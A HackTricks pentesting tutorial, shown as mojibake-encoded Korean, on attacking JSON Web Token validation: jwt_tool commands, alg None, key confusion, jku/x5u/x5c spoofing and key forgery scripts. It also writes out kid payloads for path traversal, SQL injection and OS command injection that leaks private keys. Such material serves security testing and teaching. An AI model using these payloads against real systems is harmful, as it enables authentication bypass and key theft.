# JWT ì·¨ì•½ì  (Json Web Tokens)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

If you are interested in **hacking career** and hack the unhackable - **we are hiring!** (_ìœ ì°½í•œ í´ë€ë“œì–´ êµ¬ì‚¬ í•„ìˆ˜_).

{% embed url="https://www.stmcyber.com/careers" %}

**Part of this post is based in the awesome post:** [**https://github.com/ticarpi/jwt\_tool/wiki/Attack-Methodology**](https://github.com/ticarpi/jwt\_tool/wiki/Attack-Methodology)\
**Author of the great tool to pentest JWTs** [**https://github.com/ticarpi/jwt\_tool**](https://github.com/ticarpi/jwt\_tool)

### **Quick Wins**

Run [**jwt\_tool**](https://github.com/ticarpi/jwt\_tool) with mode `All Tests!` and wait for green lines
```bash
python3 jwt_tool.py -M at \
-t "https://api.example.com/api/v1/user/76bab5dd-9307-ab04-8123-fda81234245" \
-rh "Authorization: Bearer eyJhbG...<JWT Token>"
```
ìš´ì´ ì¢‹ë‹¤ë©´ ë„êµ¬ê°€ ì›¹ ì• í”Œë¦¬ì¼€ì´ì…˜ì´ JWTë¥¼ ì˜ëª» í™•ì¸í•˜ëŠ” ê²½ìš°ë¥¼ ì°¾ì„ ê²ƒì…ë‹ˆë‹¤:

![](<../.gitbook/assets/image (935).png>)

ê·¸ëŸ° ë‹¤ìŒ, í”„ë¡ì‹œì—ì„œ ìš”ì²­ì„ ê²€ìƒ‰í•˜ê±°ë‚˜ jwt\_ toolì„ ì‚¬ìš©í•˜ì—¬ í•´ë‹¹ ìš”ì²­ì— ì‚¬ìš©ëœ JWTë¥¼ ë¤í”„í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```bash
python3 jwt_tool.py -Q "jwttool_706649b802c9f5e41052062a3787b291"
```
You can also use the [**Burp Extension SignSaboteur**](https://github.com/d0ge/sign-saboteur) to launch JWT attacks from Burp.

### ë°ì´í„° ë³€ì¡°í•˜ê¸° (ìˆ˜ì • ì—†ì´)

ì„œëª…ì€ ê·¸ëŒ€ë¡œ ë‘ê³  ë°ì´í„°ë¥¼ ë³€ì¡°í•˜ì—¬ ì„œë²„ê°€ ì„œëª…ì„ í™•ì¸í•˜ëŠ”ì§€ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì˜ˆë¥¼ ë“¤ì–´ ì‚¬ìš©ì ì´ë¦„ì„ "admin"ìœ¼ë¡œ ë³€ê²½í•´ ë³´ì„¸ìš”.

#### **í† í°ì´ í™•ì¸ë˜ë‚˜ìš”?**

JWTì˜ ì„œëª…ì´ ê²€ì¦ë˜ëŠ”ì§€ í™•ì¸í•˜ë ¤ë©´:

* ì˜¤ë¥˜ ë©”ì‹œì§€ê°€ ê²€ì¦ì´ ì§„í–‰ ì¤‘ì„ì„ ë‚˜íƒ€ë‚´ë©°, ìì„¸í•œ ì˜¤ë¥˜ì—ì„œ ë¯¼ê°í•œ ì„¸ë¶€ì •ë³´ë¥¼ ê²€í† í•´ì•¼ í•©ë‹ˆë‹¤.
* ë°˜í™˜ëœ í˜ì´ì§€ì˜ ë³€ê²½ë„ ê²€ì¦ì„ ë‚˜íƒ€ëƒ…ë‹ˆë‹¤.
* ë³€ê²½ì´ ì—†ìœ¼ë©´ ê²€ì¦ì´ ì—†ìŒì„ ë‚˜íƒ€ë‚´ë©°, ì´ë•Œ í˜ì´ë¡œë“œ í´ë ˆì„ì„ ë³€ì¡°í•´ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### ì¶œì²˜

í† í°ì´ ì„œë²„ ì¸¡ì—ì„œ ìƒì„±ë˜ì—ˆëŠ”ì§€ í´ë¼ì´ì–¸íŠ¸ ì¸¡ì—ì„œ ìƒì„±ë˜ì—ˆëŠ”ì§€ë¥¼ í™•ì¸í•˜ê¸° ìœ„í•´ í”„ë¡ì‹œì˜ ìš”ì²­ ê¸°ë¡ì„ ê²€í† í•˜ëŠ” ê²ƒì´ ì¤‘ìš”í•©ë‹ˆë‹¤.

* í´ë¼ì´ì–¸íŠ¸ ì¸¡ì—ì„œ ì²˜ìŒ ë³´ì´ëŠ” í† í°ì€ í‚¤ê°€ í´ë¼ì´ì–¸íŠ¸ ì¸¡ ì½”ë“œì— ë…¸ì¶œë  ìˆ˜ ìˆìŒì„ ì‹œì‚¬í•˜ë©°, ì¶”ê°€ ì¡°ì‚¬ê°€ í•„ìš”í•©ë‹ˆë‹¤.
* ì„œë²„ ì¸¡ì—ì„œ ë°œìƒí•œ í† í°ì€ ì•ˆì „í•œ í”„ë¡œì„¸ìŠ¤ë¥¼ ë‚˜íƒ€ëƒ…ë‹ˆë‹¤.

### ì§€ì† ì‹œê°„

í† í°ì´ 24ì‹œê°„ ì´ìƒ ì§€ì†ë˜ëŠ”ì§€ í™•ì¸í•˜ì„¸ìš”... ì•„ë§ˆë„ ë§Œë£Œë˜ì§€ ì•Šì„ ê²ƒì…ë‹ˆë‹¤. "exp" í•„ë“œê°€ ìˆë‹¤ë©´ ì„œë²„ê°€ ì´ë¥¼ ì˜¬ë°”ë¥´ê²Œ ì²˜ë¦¬í•˜ëŠ”ì§€ í™•ì¸í•˜ì„¸ìš”.

### HMAC ë¹„ë°€ í‚¤ ë¬´ì°¨ë³„ ëŒ€ì…

[**ì´ í˜ì´ì§€ë¥¼ ì°¸ì¡°í•˜ì„¸ìš”.**](../generic-methodologies-and-resources/brute-force.md#jwt)

### ì•Œê³ ë¦¬ì¦˜ì„ Noneìœ¼ë¡œ ìˆ˜ì •

ì‚¬ìš©ëœ ì•Œê³ ë¦¬ì¦˜ì„ "None"ìœ¼ë¡œ ì„¤ì •í•˜ê³  ì„œëª… ë¶€ë¶„ì„ ì œê±°í•˜ì„¸ìš”.

Burp í™•ì¥ ê¸°ëŠ¥ "JSON Web Token"ì„ ì‚¬ìš©í•˜ì—¬ ì´ ì·¨ì•½ì ì„ ì‹œë„í•˜ê³  JWT ë‚´ë¶€ì˜ ë‹¤ì–‘í•œ ê°’ì„ ë³€ê²½í•˜ì„¸ìš” (ìš”ì²­ì„ Repeaterë¡œ ë³´ë‚´ê³  "JSON Web Token" íƒ­ì—ì„œ í† í°ì˜ ê°’ì„ ìˆ˜ì •í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. "Alg" í•„ë“œì˜ ê°’ì„ "None"ìœ¼ë¡œ ì„¤ì •í•  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤).

### ì•Œê³ ë¦¬ì¦˜ RS256(ë¹„ëŒ€ì¹­)ì„ HS256(ëŒ€ì¹­)ìœ¼ë¡œ ë³€ê²½ (CVE-2016-5431/CVE-2016-10555)

ì•Œê³ ë¦¬ì¦˜ HS256ì€ ë¹„ë°€ í‚¤ë¥¼ ì‚¬ìš©í•˜ì—¬ ê° ë©”ì‹œì§€ì— ì„œëª…í•˜ê³  ê²€ì¦í•©ë‹ˆë‹¤.\
ì•Œê³ ë¦¬ì¦˜ RS256ì€ ê°œì¸ í‚¤ë¥¼ ì‚¬ìš©í•˜ì—¬ ë©”ì‹œì§€ì— ì„œëª…í•˜ê³  ì¸ì¦ì„ ìœ„í•´ ê³µê°œ í‚¤ë¥¼ ì‚¬ìš©í•©ë‹ˆë‹¤.

ì•Œê³ ë¦¬ì¦˜ì„ RS256ì—ì„œ HS256ìœ¼ë¡œ ë³€ê²½í•˜ë©´ ë°±ì—”ë“œ ì½”ë“œëŠ” ê³µê°œ í‚¤ë¥¼ ë¹„ë°€ í‚¤ë¡œ ì‚¬ìš©í•˜ê³  HS256 ì•Œê³ ë¦¬ì¦˜ì„ ì‚¬ìš©í•˜ì—¬ ì„œëª…ì„ ê²€ì¦í•©ë‹ˆë‹¤.

ê·¸ëŸ° ë‹¤ìŒ ê³µê°œ í‚¤ë¥¼ ì‚¬ìš©í•˜ê³  RS256ì„ HS256ìœ¼ë¡œ ë³€ê²½í•˜ì—¬ ìœ íš¨í•œ ì„œëª…ì„ ìƒì„±í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ë¥¼ ì‹¤í–‰í•˜ì—¬ ì›¹ ì„œë²„ì˜ ì¸ì¦ì„œë¥¼ ê°€ì ¸ì˜¬ ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```bash
openssl s_client -connect example.com:443 2>&1 < /dev/null | sed -n '/-----BEGIN/,/-----END/p' > certificatechain.pem #For this attack you can use the JOSEPH Burp extension. In the Repeater, select the JWS tab and select the Key confusion attack. Load the PEM, Update the request and send it. (This extension allows you to send the "non" algorithm attack also). It is also recommended to use the tool jwt_tool with the option 2 as the previous Burp Extension does not always works well.
openssl x509 -pubkey -in certificatechain.pem -noout > pubkey.pem
```
### New public key inside the header

ê³µê²©ìëŠ” í† í°ì˜ í—¤ë”ì— ìƒˆë¡œìš´ í‚¤ë¥¼ ì‚½ì…í•˜ê³  ì„œë²„ëŠ” ì´ ìƒˆë¡œìš´ í‚¤ë¥¼ ì‚¬ìš©í•˜ì—¬ ì„œëª…ì„ ê²€ì¦í•©ë‹ˆë‹¤ (CVE-2018-0114).

ì´ ì‘ì—…ì€ "JSON Web Tokens" Burp í™•ì¥ì„ ì‚¬ìš©í•˜ì—¬ ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.\
(ìš”ì²­ì„ Repeaterë¡œ ë³´ë‚´ê³ , JSON Web Token íƒ­ì—ì„œ "CVE-2018-0114"ë¥¼ ì„ íƒí•œ í›„ ìš”ì²­ì„ ë³´ëƒ…ë‹ˆë‹¤).

### JWKS Spoofing

ì§€ì¹¨ì€ "jku" í—¤ë” í´ë ˆì„ì„ ì‚¬ìš©í•˜ëŠ” JWT í† í°ì˜ ë³´ì•ˆì„ í‰ê°€í•˜ëŠ” ë°©ë²•ì„ ìì„¸íˆ ì„¤ëª…í•©ë‹ˆë‹¤. ì´ í´ë ˆì„ì€ í† í° ê²€ì¦ì— í•„ìš”í•œ ê³µê°œ í‚¤ê°€ í¬í•¨ëœ JWKS (JSON Web Key Set) íŒŒì¼ì— ì—°ê²°ë˜ì–´ì•¼ í•©ë‹ˆë‹¤.

* **"jku" í—¤ë”ë¡œ í† í° í‰ê°€**:
* "jku" í´ë ˆì„ì˜ URLì„ í™•ì¸í•˜ì—¬ ì ì ˆí•œ JWKS íŒŒì¼ë¡œ ì—°ê²°ë˜ëŠ”ì§€ í™•ì¸í•©ë‹ˆë‹¤.
* í† í°ì˜ "jku" ê°’ì„ ìˆ˜ì •í•˜ì—¬ ì œì–´ëœ ì›¹ ì„œë¹„ìŠ¤ë¡œ í–¥í•˜ê²Œ í•˜ì—¬ íŠ¸ë˜í”½ì„ ê´€ì°°í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
* **HTTP ìƒí˜¸ì‘ìš© ëª¨ë‹ˆí„°ë§**:
* ì§€ì •í•œ URLë¡œì˜ HTTP ìš”ì²­ì„ ê´€ì°°í•˜ë©´ ì„œë²„ê°€ ì œê³µëœ ë§í¬ì—ì„œ í‚¤ë¥¼ ê°€ì ¸ì˜¤ë ¤ëŠ” ì‹œë„ë¥¼ ë‚˜íƒ€ëƒ…ë‹ˆë‹¤.
* ì´ í”„ë¡œì„¸ìŠ¤ì— `jwt_tool`ì„ ì‚¬ìš©í•  ë•ŒëŠ” í…ŒìŠ¤íŠ¸ë¥¼ ìš©ì´í•˜ê²Œ í•˜ê¸° ìœ„í•´ ê°œì¸ JWKS ìœ„ì¹˜ë¡œ `jwtconf.ini` íŒŒì¼ì„ ì—…ë°ì´íŠ¸í•˜ëŠ” ê²ƒì´ ì¤‘ìš”í•©ë‹ˆë‹¤.
* **`jwt_tool` ëª…ë ¹**:
*   ë‹¤ìŒ ëª…ë ¹ì„ ì‹¤í–‰í•˜ì—¬ `jwt_tool`ë¡œ ì‹œë‚˜ë¦¬ì˜¤ë¥¼ ì‹œë®¬ë ˆì´ì…˜í•©ë‹ˆë‹¤:

```bash
python3 jwt_tool.py JWT_HERE -X s
```

### Kid Issues Overview

ì„ íƒì  í—¤ë” í´ë ˆì„ì¸ `kid`ëŠ” íŠ¹ì • í‚¤ë¥¼ ì‹ë³„í•˜ëŠ” ë° ì‚¬ìš©ë˜ë©°, ì´ëŠ” í† í° ì„œëª… ê²€ì¦ì„ ìœ„í•´ ì—¬ëŸ¬ í‚¤ê°€ ì¡´ì¬í•˜ëŠ” í™˜ê²½ì—ì„œ íŠ¹íˆ ì¤‘ìš”í•©ë‹ˆë‹¤. ì´ í´ë ˆì„ì€ í† í°ì˜ ì„œëª…ì„ ê²€ì¦í•˜ê¸° ìœ„í•´ ì ì ˆí•œ í‚¤ë¥¼ ì„ íƒí•˜ëŠ” ë° ë„ì›€ì„ ì¤ë‹ˆë‹¤.

#### Revealing Key through "kid"

í—¤ë”ì— `kid` í´ë ˆì„ì´ ì¡´ì¬í•  ë•Œ, í•´ë‹¹ íŒŒì¼ì´ë‚˜ ê·¸ ë³€í˜•ì„ ì›¹ ë””ë ‰í† ë¦¬ì—ì„œ ê²€ìƒ‰í•˜ëŠ” ê²ƒì´ ì¢‹ìŠµë‹ˆë‹¤. ì˜ˆë¥¼ ë“¤ì–´, `"kid":"key/12345"`ê°€ ì§€ì •ëœ ê²½ìš°, ì›¹ ë£¨íŠ¸ì—ì„œ _/key/12345_ ë° _/key/12345.pem_ íŒŒì¼ì„ ê²€ìƒ‰í•´ì•¼ í•©ë‹ˆë‹¤.

#### Path Traversal with "kid"

`kid` í´ë ˆì„ì€ íŒŒì¼ ì‹œìŠ¤í…œì„ íƒìƒ‰í•˜ëŠ” ë° ì•…ìš©ë  ìˆ˜ ìˆìœ¼ë©°, ì„ì˜ì˜ íŒŒì¼ì„ ì„ íƒí•  ìˆ˜ ìˆëŠ” ê°€ëŠ¥ì„±ì„ ì œê³µí•©ë‹ˆë‹¤. íŠ¹ì • íŒŒì¼ì´ë‚˜ ì„œë¹„ìŠ¤ë¥¼ ëª©í‘œë¡œ `kid` ê°’ì„ ë³€ê²½í•˜ì—¬ ì—°ê²°ì„±ì„ í…ŒìŠ¤íŠ¸í•˜ê±°ë‚˜ ì„œë²„ ì¸¡ ìš”ì²­ ìœ„ì¡°(SSRF) ê³µê²©ì„ ì‹¤í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì›ë˜ ì„œëª…ì„ ìœ ì§€í•˜ë©´ì„œ `kid` ê°’ì„ ë³€ê²½í•˜ê¸° ìœ„í•´ JWTë¥¼ ì¡°ì‘í•˜ëŠ” ê²ƒì€ jwt\_toolì—ì„œ `-T` í”Œë˜ê·¸ë¥¼ ì‚¬ìš©í•˜ì—¬ ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```bash
python3 jwt_tool.py <JWT> -I -hc kid -hv "../../dev/null" -S hs256 -p ""
```
ì˜ˆì¸¡ ê°€ëŠ¥í•œ ë‚´ìš©ì„ ê°€ì§„ íŒŒì¼ì„ íƒ€ê²ŸíŒ…í•¨ìœ¼ë¡œì¨ ìœ íš¨í•œ JWTë¥¼ ìœ„ì¡°í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì˜ˆë¥¼ ë“¤ì–´, Linux ì‹œìŠ¤í…œì˜ `/proc/sys/kernel/randomize_va_space` íŒŒì¼ì€ ê°’ **2**ë¥¼ í¬í•¨í•˜ê³  ìˆìœ¼ë©°, JWT ìƒì„±ì„ ìœ„í•œ ëŒ€ì¹­ ë¹„ë°€ë²ˆí˜¸ë¡œ **2**ë¥¼ `kid` ë§¤ê°œë³€ìˆ˜ì— ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

#### "kid"ë¥¼ í†µí•œ SQL ì¸ì ì…˜

`kid` í´ë ˆì„ì˜ ë‚´ìš©ì„ ì‚¬ìš©í•˜ì—¬ ë°ì´í„°ë² ì´ìŠ¤ì—ì„œ ë¹„ë°€ë²ˆí˜¸ë¥¼ ê°€ì ¸ì˜¤ëŠ” ê²½ìš°, `kid` í˜ì´ë¡œë“œë¥¼ ìˆ˜ì •í•˜ì—¬ SQL ì¸ì ì…˜ì„ ìœ ë„í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. JWT ì„œëª… í”„ë¡œì„¸ìŠ¤ë¥¼ ë³€ê²½í•˜ê¸° ìœ„í•´ SQL ì¸ì ì…˜ì„ ì‚¬ìš©í•˜ëŠ” ì˜ˆì‹œ í˜ì´ë¡œë“œëŠ” ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤:

`non-existent-index' UNION SELECT 'ATTACKER';-- -`

ì´ ë³€ê²½ì€ JWT ì„œëª…ì„ ìœ„í•´ ì•Œë ¤ì§„ ë¹„ë°€ í‚¤ì¸ `ATTACKER`ë¥¼ ì‚¬ìš©í•˜ë„ë¡ ê°•ì œí•©ë‹ˆë‹¤.

#### "kid"ë¥¼ í†µí•œ OS ì¸ì ì…˜

`kid` ë§¤ê°œë³€ìˆ˜ê°€ ëª…ë ¹ ì‹¤í–‰ ì»¨í…ìŠ¤íŠ¸ ë‚´ì—ì„œ ì‚¬ìš©ë˜ëŠ” íŒŒì¼ ê²½ë¡œë¥¼ ì§€ì •í•˜ëŠ” ê²½ìš°, ì›ê²© ì½”ë“œ ì‹¤í–‰(RCE) ì·¨ì•½ì ì´ ë°œìƒí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. `kid` ë§¤ê°œë³€ìˆ˜ì— ëª…ë ¹ì„ ì£¼ì…í•¨ìœ¼ë¡œì¨ ê°œì¸ í‚¤ë¥¼ ë…¸ì¶œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. RCE ë° í‚¤ ë…¸ì¶œì„ ë‹¬ì„±í•˜ê¸° ìœ„í•œ ì˜ˆì‹œ í˜ì´ë¡œë“œëŠ” ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤:

`/root/res/keys/secret7.key; cd /root/res/keys/ && python -m SimpleHTTPServer 1337&`

### x5u ë° jku

#### jku

jkuëŠ” **JWK Set URL**ì„ ì˜ë¯¸í•©ë‹ˆë‹¤.\
í† í°ì´ â€œ**jku**â€ **í—¤ë”** í´ë ˆì„ì„ ì‚¬ìš©í•˜ëŠ” ê²½ìš°, **ì œê³µëœ URLì„ í™•ì¸í•˜ì‹­ì‹œì˜¤**. ì´ URLì€ í† í°ì„ ê²€ì¦í•˜ê¸° ìœ„í•œ ê³µê°œ í‚¤ë¥¼ í¬í•¨í•˜ëŠ” JWKS íŒŒì¼ì„ ê°€ë¦¬ì¼œì•¼ í•©ë‹ˆë‹¤. í† í°ì„ ë³€ì¡°í•˜ì—¬ jku ê°’ì„ ëª¨ë‹ˆí„°ë§í•  ìˆ˜ ìˆëŠ” ì›¹ ì„œë¹„ìŠ¤ë¡œ í¬ì¸íŒ…í•˜ì‹­ì‹œì˜¤.

ë¨¼ì € ìƒˆë¡œìš´ ê°œì¸ ë° ê³µê°œ í‚¤ë¡œ ìƒˆë¡œìš´ ì¸ì¦ì„œë¥¼ ìƒì„±í•´ì•¼ í•©ë‹ˆë‹¤.
```bash
openssl genrsa -out keypair.pem 2048
openssl rsa -in keypair.pem -pubout -out publickey.crt
openssl pkcs8 -topk8 -inform PEM -outform PEM -nocrypt -in keypair.pem -out pkcs8.key
```
ê·¸ëŸ° ë‹¤ìŒ ì˜ˆë¥¼ ë“¤ì–´ [**jwt.io**](https://jwt.io)ë¥¼ ì‚¬ìš©í•˜ì—¬ **ìƒì„±ëœ ê³µê°œ ë° ê°œì¸ í‚¤ë¡œ ìƒˆë¡œìš´ JWTë¥¼ ë§Œë“¤ê³  jku ë§¤ê°œë³€ìˆ˜ë¥¼ ìƒì„±ëœ ì¸ì¦ì„œë¡œ ì§€ì •í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.** ìœ íš¨í•œ jku ì¸ì¦ì„œë¥¼ ë§Œë“¤ê¸° ìœ„í•´ ì›ë³¸ ì¸ì¦ì„œë¥¼ ë‹¤ìš´ë¡œë“œí•˜ê³  í•„ìš”í•œ ë§¤ê°œë³€ìˆ˜ë¥¼ ë³€ê²½í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ê³µê°œ ì¸ì¦ì„œì—ì„œ "e" ë° "n" ë§¤ê°œë³€ìˆ˜ë¥¼ ì–»ìœ¼ë ¤ë©´ ë‹¤ìŒì„ ì‚¬ìš©í•˜ì‹­ì‹œì˜¤:
```bash
from Crypto.PublicKey import RSA
fp = open("publickey.crt", "r")
key = RSA.importKey(fp.read())
fp.close()
print("n:", hex(key.n))
print("e:", hex(key.e))
```
#### x5u

X.509 URL. PEM í˜•ì‹ìœ¼ë¡œ ì¸ì½”ë”©ëœ X.509(ì¸ì¦ì„œ í˜•ì‹ í‘œì¤€) ê³µê°œ ì¸ì¦ì„œ ì§‘í•©ì„ ê°€ë¦¬í‚¤ëŠ” URIì…ë‹ˆë‹¤. ì§‘í•©ì˜ ì²« ë²ˆì§¸ ì¸ì¦ì„œëŠ” ì´ JWTë¥¼ ì„œëª…í•˜ëŠ” ë° ì‚¬ìš©ëœ ì¸ì¦ì„œì—¬ì•¼ í•©ë‹ˆë‹¤. ì´í›„ì˜ ì¸ì¦ì„œëŠ” ê°ê° ì´ì „ ì¸ì¦ì„œë¥¼ ì„œëª…í•˜ì—¬ ì¸ì¦ì„œ ì²´ì¸ì„ ì™„ì„±í•©ë‹ˆë‹¤. X.509ëŠ” RFC 52807ì— ì •ì˜ë˜ì–´ ìˆìŠµë‹ˆë‹¤. ì¸ì¦ì„œë¥¼ ì „ì†¡í•˜ë ¤ë©´ ì „ì†¡ ë³´ì•ˆì´ í•„ìš”í•©ë‹ˆë‹¤.

**ì´ í—¤ë”ë¥¼ ê·€í•˜ì˜ ì œì–´ í•˜ì— ìˆëŠ” URLë¡œ ë³€ê²½**í•˜ê³  ìš”ì²­ì´ ìˆ˜ì‹ ë˜ëŠ”ì§€ í™•ì¸í•˜ì‹­ì‹œì˜¤. ê·¸ëŸ° ê²½ìš° **JWTë¥¼ ë³€ì¡°í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤**.

ê·€í•˜ê°€ ì œì–´í•˜ëŠ” ì¸ì¦ì„œë¥¼ ì‚¬ìš©í•˜ì—¬ ìƒˆ í† í°ì„ ìœ„ì¡°í•˜ë ¤ë©´ ì¸ì¦ì„œë¥¼ ìƒì„±í•˜ê³  ê³µê°œ ë° ê°œì¸ í‚¤ë¥¼ ì¶”ì¶œí•´ì•¼ í•©ë‹ˆë‹¤:
```bash
openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout attacker.key -out attacker.crt
openssl x509 -pubkey -noout -in attacker.crt > publicKey.pem
```
ê·¸ëŸ° ë‹¤ìŒ ì˜ˆë¥¼ ë“¤ì–´ [**jwt.io**](https://jwt.io)ë¥¼ ì‚¬ìš©í•˜ì—¬ **ìƒì„±ëœ ê³µê°œ ë° ê°œì¸ í‚¤ë¡œ ìƒˆë¡œìš´ JWTë¥¼ ë§Œë“¤ê³  x5u ë§¤ê°œë³€ìˆ˜ë¥¼ ìƒì„±ëœ .crt ì¸ì¦ì„œë¡œ ì§€ì •í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.**

![](<../.gitbook/assets/image (956).png>)

ì´ ë‘ ê°€ì§€ ì·¨ì•½ì ì„ **SSRFì— ëŒ€í•´ ì•…ìš©í•  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤.**

#### x5c

ì´ ë§¤ê°œë³€ìˆ˜ëŠ” **base64ë¡œ ì¸ì½”ë”©ëœ ì¸ì¦ì„œ**ë¥¼ í¬í•¨í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

![](<../.gitbook/assets/image (1119).png>)

ê³µê²©ìê°€ **ìì²´ ì„œëª…ëœ ì¸ì¦ì„œ**ë¥¼ ìƒì„±í•˜ê³  í•´ë‹¹ ê°œì¸ í‚¤ë¥¼ ì‚¬ìš©í•˜ì—¬ ìœ„ì¡°ëœ í† í°ì„ ìƒì„±í•œ ë‹¤ìŒ "x5c" ë§¤ê°œë³€ìˆ˜ì˜ ê°’ì„ ìƒˆë¡œ ìƒì„±ëœ ì¸ì¦ì„œë¡œ êµì²´í•˜ê³  ë‹¤ë¥¸ ë§¤ê°œë³€ìˆ˜, ì¦‰ n, e ë° x5të¥¼ ìˆ˜ì •í•˜ë©´ ë³¸ì§ˆì ìœ¼ë¡œ ìœ„ì¡°ëœ í† í°ì´ ì„œë²„ì— ì˜í•´ ìˆ˜ë½ë  ê²ƒì…ë‹ˆë‹¤.
```bash
openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout attacker.key -outattacker.crt
openssl x509 -in attacker.crt -text
```
### Embedded Public Key (CVE-2018-0114)

JWTì— ë‹¤ìŒê³¼ ê°™ì€ ì‹œë‚˜ë¦¬ì˜¤ì²˜ëŸ¼ ë‚´ì¥ëœ ê³µê°œ í‚¤ê°€ ìˆëŠ” ê²½ìš°:

![](<../.gitbook/assets/image (624).png>)

ë‹¤ìŒ nodejs ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‚¬ìš©í•˜ë©´ í•´ë‹¹ ë°ì´í„°ì—ì„œ ê³µê°œ í‚¤ë¥¼ ìƒì„±í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```bash
const NodeRSA = require('node-rsa');
const fs = require('fs');
n ="â€‹ANQ3hoFoDxGQMhYOAc6CHmzz6_Z20hiP1Nvl1IN6phLwBj5gLei3e4e-DDmdwQ1zOueacCun0DkX1gMtTTX36jR8CnoBRBUTmNsQ7zaL3jIU4iXeYGuy7WPZ_TQEuAO1ogVQudn2zTXEiQeh-58tuPeTVpKmqZdS3Mpum3l72GHBbqggo_1h3cyvW4j3QM49YbV35aHV3WbwZJXPzWcDoEnCM4EwnqJiKeSpxvaClxQ5nQo3h2WdnV03C5WuLWaBNhDfC_HItdcaZ3pjImAjo4jkkej6mW3eXqtmDX39uZUyvwBzreMWh6uOu9W0DMdGBbfNNWcaR5tSZEGGj2divE8"â€‹;
e = "AQAB";
const key = new NodeRSA();
var importedKey = key.importKey({n: Buffer.from(n, 'base64'),e: Buffer.from(e, 'base64'),}, 'components-public');
console.log(importedKey.exportKey("public"));
```
ìƒˆë¡œìš´ ê°œì¸/ê³µê°œ í‚¤ë¥¼ ìƒì„±í•˜ê³ , ìƒˆë¡œìš´ ê³µê°œ í‚¤ë¥¼ í† í°ì— ì‚½ì…í•œ í›„ ì´ë¥¼ ì‚¬ìš©í•˜ì—¬ ìƒˆë¡œìš´ ì„œëª…ì„ ìƒì„±í•˜ëŠ” ê²ƒì´ ê°€ëŠ¥í•©ë‹ˆë‹¤:
```bash
openssl genrsa -out keypair.pem 2048
openssl rsa -in keypair.pem -pubout -out publickey.crt
openssl pkcs8 -topk8 -inform PEM -outform PEM -nocrypt -in keypair.pem -out pkcs8.key
```
ì´ nodejs ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‚¬ìš©í•˜ì—¬ "n"ê³¼ "e"ë¥¼ ì–»ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```bash
const NodeRSA = require('node-rsa');
const fs = require('fs');
keyPair = fs.readFileSync("keypair.pem");
const key = new NodeRSA(keyPair);
const publicComponents = key.exportKey('components-public');
console.log('Parameter n: ', publicComponents.n.toString("hex"));
console.log('Parameter e: ', publicComponents.e.toString(16));
```
Finally, using the public and private key and the new "n" and "e" values you can use [jwt.io](https://jwt.io) to forge a new valid JWT with any information.

### ES256: ê°™ì€ nonceë¡œ ê°œì¸ í‚¤ ë…¸ì¶œ

ì¼ë¶€ ì• í”Œë¦¬ì¼€ì´ì…˜ì´ ES256ì„ ì‚¬ìš©í•˜ê³  ê°™ì€ nonceë¥¼ ì‚¬ìš©í•˜ì—¬ ë‘ ê°œì˜ jwtë¥¼ ìƒì„±í•˜ëŠ” ê²½ìš°, ê°œì¸ í‚¤ë¥¼ ë³µì›í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ì—¬ê¸° ì˜ˆì‹œê°€ ìˆìŠµë‹ˆë‹¤: [ECDSA: ê°™ì€ nonceë¥¼ ì‚¬ìš©í•  ê²½ìš° ê°œì¸ í‚¤ ë…¸ì¶œ (SECP256k1 ì‚¬ìš©)](https://asecuritysite.com/encryption/ecd5)

### JTI (JWT ID)

